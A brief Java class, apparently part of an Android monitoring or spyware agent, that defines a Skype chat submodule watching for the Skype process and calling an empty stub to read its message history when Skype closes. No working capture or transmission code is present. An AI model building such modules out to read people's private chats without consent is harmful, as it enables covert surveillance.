package com.android.networking.module.submodule;

public class ChatSkype extends SubModuleChat {
	private static final String TAG = "ChatSkype";
	
	private static final int PROGRAM_SKYPE = 0x07;
	String pObserving = "skype";

	@Override
	int getProgramId() {
		return PROGRAM_SKYPE;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		readSkypeMessageHistory();
		
	}

	private void readSkypeMessageHistory() {
		// TODO Auto-generated method stub
		
	}

}
